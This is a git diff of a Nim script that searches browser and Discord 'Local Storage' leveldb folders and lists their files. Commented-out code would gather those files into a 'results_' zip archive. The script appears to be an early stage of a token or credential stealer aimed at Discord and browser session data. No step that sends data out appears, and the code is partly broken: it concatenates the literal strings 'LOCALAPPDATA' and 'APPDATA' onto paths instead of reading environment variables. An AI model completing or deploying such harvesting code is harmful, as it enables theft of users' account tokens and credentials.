@@ -1,14 +1,10 @@
 import os
-import times
-import zip/zipfiles
-import nimzip
+#import times
+#import zip/zipfiles
+#import nimzip
+
 # For some reason, zip/zipfiles would not let me write multiple files to one zip.
 # For now, I will be using nimzip.
-
-#var z: ZipArchive
-timestamp = "results_" & currentTime() & ".zip"
-var zip = zip_open(timestamp, 6, 'w')
-#    archive = z.open(timestamp, fmWrite)
 
 type
     BrowserDir = array[5, string]
@@ -29,28 +25,23 @@ let discordDirectories: DiscDir = [
     "\\discordcanary\\Local Storage\\leveldb\\"
 ]
 
-proc currentTime(): string =
-    let timenow = getTime()
-    return format(timenow, "yyyymmdd-HHMMss")
+# Timestamp for zip.
+#proc currentTime(): string =
+#    let timenow = getTime()
+#    return format(timenow, "yyyymmdd-HHMMss")
+#timestamp = "results_" & currentTime() & ".zip"
+#var zip = zip_open(timestamp, 6, 'w')
 
 
 
-
+# leveldb discovery.
+# Currently just finds the directory, as zip functionality isn't working as expected.
 proc levelDBfinder() =
-        
-    #var z: ZipArchive
-    
-    #if not z.open(timestamp, fmAppend):
-    #    if not z.open(timestamp, fmWrite):
-    #        echo "lol"
-    #        quit(1)
-    #proc addtoZip(zipFile: string, path: string) =    
-    #    z.addFile(zipFile, path)
     proc collectFiles(x: string): string =
         for i in walkDir(x):
             if i.kind == pcFile:
                 echo i
-                z.addFile(timestamp, $i.path)
+                #z.addFile(timestamp, $i.path)
 
     proc findRelevantPath(x: string): string =
         var g=""
@@ -64,28 +55,27 @@ proc levelDBfinder() =
                     #    if f.kind == pcFile:
                     #        z.addFile(timestamp, $f.path)
         discard g
-    
 
     proc fileCrawlerUno(x: string): string =
-        #let path = "LOCALAPPDATA" & x
-        let path = x
+        let path = "LOCALAPPDATA" & x
+        #let path = x
         if os.dirExists(path):
             findRelevantPath(path)
         else:
             return
 
-#    proc fileCrawlerDos(x: string): string =
-#        let path = "APPDATA" & x
-#        if os.dirExists(path):
-#            findRelevant(path)
-#        else:
-#            return
+    proc fileCrawlerDos(x: string): string =
+        let path = "APPDATA" & x
+        if os.dirExists(path):
+            findRelevantPath(path)
+        else:
+            return
 
     for i in browserDirectories:
         let result = fileCrawlerUno(i)
-        #echo result
-#    for i in discordDirectories:
-#        let result = fileCrawlerDos(i)
-#        echo result
-    z.close()
+        echo result
+    for i in discordDirectories:
+        let result = fileCrawlerDos(i)
+        echo result
+
 levelDBfinder()
